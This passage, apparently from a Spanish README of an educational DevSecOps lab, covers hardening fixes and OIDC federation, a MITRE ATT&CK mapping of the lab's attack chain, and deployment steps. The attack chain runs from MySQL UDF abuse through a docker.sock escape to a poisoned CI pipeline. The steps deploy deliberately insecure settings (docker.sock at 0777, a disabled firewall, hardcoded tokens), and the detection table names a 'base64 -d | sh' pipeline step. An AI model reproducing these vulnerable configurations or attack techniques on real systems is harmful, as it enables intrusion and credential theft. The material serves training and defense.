    pod-security.kubernetes.io/warn: restricted
```

```bash
# Cifrado de Secrets en reposo (K3s)
curl -sfL https://get.k3s.io | sh -s - --secrets-encryption --write-kubeconfig-mode 600
k3s secrets-encrypt status   # → Encryption: enabled (AES-CBC 256)
```

**Control restaurado:** ningún pod accede al daemon, al filesystem ni a los namespaces del host, y los Secrets dejan de ser legibles desde disco sin la clave.
**Control sistémico:** PSA `restricted` rechaza `privileged`/`hostPath`/`hostPID`/`hostNetwork` en el propio API server; OPA Gatekeeper/Kyverno para políticas de imagen; Kaniko/Buildah para builds sin `docker.sock`.

</details>

<details>
<summary><strong>Diffs · CI/CD y credenciales federadas (OIDC)</strong></summary>

```diff
# gitea-deployment.yaml
- kind: ConfigMap
-   app.ini: | ... SECRET_KEY = secretkeylabdevsecops ...
+ kind: Secret            # o referencia a External Secrets Operator / Vault
+   SECRET_KEY: <base64 aleatorio>
# montado como env vía secretKeyRef, nunca en el ConfigMap

# act-runner.yaml
-     --token y2HtdzweXvxJ4g11FGxcByl8A2DjH1UiU6tpXYGl
+     --token $(cat /run/secrets/runner-token)
```

Mover los secretos a un `Secret` de Kubernetes mejora la situación, pero no elimina el problema de fondo: siguen siendo artefactos estáticos susceptibles de robo. La alternativa es no tener secretos estáticos, mediante OIDC federation:

```yaml
# workflow: credenciales temporales, sin claves estáticas
- uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-assume: arn:aws:iam::${{ vars.AWS_ACCOUNT_ID }}:role/Gitea-OIDC-Role
    aws-region: us-east-1     # sin AWS_ACCESS_KEY_ID ni AWS_SECRET_ACCESS_KEY
```

```hcl
# iam.tf — el rol solo confía en un repo/rama concretos, vía JWT firmado por Gitea
resource "aws_iam_role" "gitea_oidc_role" {
  assume_role_policy = jsonencode({ Version = "2012-10-17", Statement = [{
    Effect = "Allow"
    Principal = { Federated = aws_iam_openid_connect_provider.gitea.arn }
    Action = "sts:AssumeRoleWithWebIdentity"
    Condition = { StringEquals = { "${var.gitea_host}:sub" = "repo:${var.gitea_org}/${var.gitea_repo}:ref:refs/heads/main" } }
  }]})
}
```

Con OIDC no queda ninguna credencial en ConfigMaps, Secrets, variables de entorno ni ficheros. El token es temporal (15 minutos por defecto), se genera en tiempo de ejecución para un repositorio y rama concretos y no es válido fuera de ese contexto. Un atacante que comprometa el runner obtiene credenciales que expiran en minutos, en lugar de claves de larga duración.

**Control restaurado:** configuración y credenciales separadas, con credenciales efímeras y acotadas al contexto de ejecución.
**Control sistémico:** Gitleaks en pre-commit y en PR; `tfsec` sobre los roles OIDC; runners de un solo uso.

</details>

### Prevención, detección y respuesta

Los diffs corrigen los síntomas concretos. El proceso que los generó (desarrollo sin revisión de seguridad, IaC sin pipeline de validación, runners configurados por comodidad) volverá a producir los mismos errores si no se interviene sobre él. La cobertura se organiza en tres frentes:

```
┌───────────────────────────────────────────────────────────────────┐
│  PREVENCIÓN (shift-left)                                            │
│  tfsec / checkov en PR · Gitleaks pre-commit                       │
│  ansible-lint · Kyverno / OPA en admission controller             │
├───────────────────────────────────────────────────────────────────┤
│  DETECCIÓN (runtime)                                               │
│  IAM Access Analyzer · AWS Config Rules · Falco                   │
│  auditd en el host · Pod Security Admission en modo enforce       │
├───────────────────────────────────────────────────────────────────┤
│  RESPUESTA (post-incidente)                                       │
│  Terraform state cifrado · S3 versioning · K3s audit log         │
│  Rotación automática de credenciales · OIDC federation           │
└───────────────────────────────────────────────────────────────────┘
```

La propiedad del IaC que amplifica el impacto de un error (se despliega de forma idéntica en todos los entornos) es la misma que abarata la corrección: un fix en `iam.tf` se aplica a todos los entornos a la vez, con trazabilidad en el historial de Git.

---

## MITRE ATT&CK — cobertura

La cadena cubre 11 de las 14 tácticas de la matriz Enterprise. Quedan fuera Impact, Resource Development y Reconnaissance, por tratarse de un entorno controlado sin objetivos externos. La tabla recoge una técnica representativa por táctica, correspondiente a explotación efectiva en el laboratorio.

| Táctica | Técnica representativa | ID | Detección característica |
|---|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 | WAF: `.php` en directorio de uploads |
| Execution | UDF Abuse (`sys_eval`) | T1203 | MySQL log: `CREATE FUNCTION` + `INTO DUMPFILE` |
| Persistence | Compromise Infrastructure: CI/CD | T1584 | Gitleaks: token en diff de manifiesto |
| Privilege Escalation | Escape to Host | T1611 | Falco: contenedor con `privileged` + host mount |
| Defense Evasion | Obfuscated Files or Information | T1027 | Análisis estático: `base64 -d \| sh` en workflow |
| Credential Access | Unsecured Credentials: Kine DB | T1552.007 | auditd: acceso a `state.db` |
| Discovery | Cloud Service Discovery | T1526 | CloudTrail: ráfaga de `list-*` sin user-agent legítimo |
| Lateral Movement | Container API for Lateral Movement | T1610 | Falco: `connect` a `docker.sock` desde proceso no-`dockerd` |
| Collection | Data from Information Repositories | T1213 | FIM sobre `hostPath` de pods de infraestructura |
| Command & Control | Non-Standard Port | T1571 | Egress a puerto distinto de 80/443 desde un pod |
| Exfiltration | Exfiltration to Cloud Storage | T1567.002 | S3 access logs: `PUT` anónimo externo |

> El mapeo técnica por técnica, con materialización, detección y mitigación de cada una, está en [`docs/MITRE-MATRIX.md`](docs/MITRE-MATRIX.md). Es material de consulta.

<!-- NOTA: la tabla exhaustiva de ~40 técnicas del README original va a docs/MITRE-MATRIX.md.
     Este README solo enlaza al detalle. -->

---

## Notas técnicas

**El fallo de mayor impacto no está en la capa expuesta.** DVWA está razonablemente aislado; el fallo crítico está tres capas más adentro, en un `docker.sock` montado para facilitar el desarrollo. La ubicación esperada del riesgo (la aplicación web) y su ubicación real no coinciden, lo que es relevante a la hora de priorizar una auditoría.

**Interactuar con la Docker API sin CLI es un ejercicio de protocolo.** Sin `docker`, sin `curl` y sin utilidades de red, las peticiones REST se construyen a mano sobre el socket Unix con el módulo `socket` de Python. Varias decisiones (`alpine` en lugar de `mysql:5.7`, `NetworkMode: host` para evitar el NAT, `Binds` en lugar de `mount --bind`) resuelven fallos que no producen mensaje de error. Diagnosticar esos fallos silenciosos requirió más tiempo que el exploit final.

**El CI/CD suele quedar fuera del modelo de amenazas.** El pipeline tiene acceso legítimo a las credenciales de despliegue, y comprometerlo solo requiere una línea en un workflow YAML presentada como un paso de escaneo. En infraestructuras con despliegue continuo es uno de los vectores de mayor impacto, pese a no considerarse habitualmente un servidor de producción.

---

## Despliegue

<details>
<summary><strong>Prerrequisitos, red y orden de despliegue</strong></summary>

### Prerrequisitos

| Componente | Versión | Notas |
|---|---|---|
| SO | Ubuntu 22.04 LTS | Probado también en Debian 12 |
| Docker Engine | 24.x | LocalStack + pods del lab |
| K3s | v1.28+ | Se instala con el script de bootstrap |
| Terraform | 1.6+ | IaC sobre LocalStack |
| Ansible | 2.15+ | Provisioning del host |
| LocalStack | 3.x | Emulador AWS (`docker-compose`) |
| Kubectl / Python | 1.28+ / 3.10+ | Interacción con el clúster / scripts |
| Kali (atacante) | Rolling | `192.168.252.20`; `netcat` requerido |

### Red

```
192.168.252.0/24   Red host / Kali
192.168.252.10     Nodo K3s (control-node, donde corre todo)
192.168.252.20     Kali (atacante)
10.42.0.0/24       Red interna de pods (flannel)
10.43.0.0/24       Red de servicios (ClusterIP)
```

### Orden

```bash
# 1 — Repo
git clone https://github.com/<usuario>/devsecops-lab.git && cd devsecops-lab

# 2 — LocalStack
cd 01-cloud-iac && docker-compose up -d
curl http://localhost:4566/_localstack/health | jq '.services | .s3,.iam,.ec2,.sts'   # → "available"

# 3 — IaC vulnerable
cd vulnerable && terraform init && terraform apply -auto-approve

# 4 — K3s
curl -sfL https://get.k3s.io | sh -
export KUBECONFIG=/etc/rancher/k3s/k3s.yaml && kubectl get nodes

# 5 — Provisioning vulnerable
cd ../../02-provisioning && ansible-playbook -i inventory.ini site_vulnerable.yml
ls -la /var/run/docker.sock   # → srw-rw-rw- (0777)   |   ufw status → inactive

# 6 — Gitea + Act-Runner
cd ../03-k8s-cluster && kubectl apply -f gitea-deployment.yaml -f act-runner.yaml

# 7 — DVWA + MySQL
cd ../04-cicd-pipeline/devsecops-demo/k8s/vulnerable
kubectl apply -f mysql-vulnerable.yaml -f dvwa-vulnerable.yaml

# 8 — Configurar Gitea y subir el pipeline
#     http://192.168.252.10:30000  →  git push del devsecops-demo
```

**El entorno está listo cuando:** LocalStack healthy (S3/IAM/EC2/STS) · K3s en `Ready` · pods `Running` en `vulnerable-apps` y `gitea` · DVWA accesible en nivel "Low" · `docker.sock` en `0777` · UFW inactivo.

### Versión hardened (contraste)

```bash
cd 01-cloud-iac/hardened  && terraform apply -auto-approve
cd 02-provisioning        && ansible-playbook -i inventory.ini site_hardened.yml
```

</details>

---

## Referencias

- **MITRE ATT&CK Enterprise** — [attack.mitre.org](https://attack.mitre.org) — vocabulario del mapeo táctico.
- **UDF Abuse (MySQL)** — módulo `lib_mysqludf_sys` de [Rapid7/Metasploit](https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql).
- **Docker socket escape** — análisis de Rory McCune / NCC Group sobre abuso del socket Unix sin CLI.
- **Poisoned Pipeline Execution** — Aviv Grafi, Argon Security (2021), *Attacking CI/CD without any Access to Source Code*.
- **OIDC Federation** — AWS, *Creating OIDC identity providers* + Gitea Actions / `aws-actions/configure-aws-credentials`.
- **K3s Secrets Encryption** — [docs.k3s.io/security/secrets-encryption](https://docs.k3s.io/security/secrets-encryption).
- **tfsec / checkov** — [aquasecurity.github.io/tfsec](https://aquasecurity.github.io/tfsec) · [checkov.io](https://checkov.io).

---

## Licencia

MIT — exclusivamente para fines educativos y de demostración en entornos controlados y aislados. Usar estas técnicas contra sistemas sin autorización explícita del propietario es ilegal; el autor no asume responsabilidad por el uso fuera del contexto para el que fue diseñado.
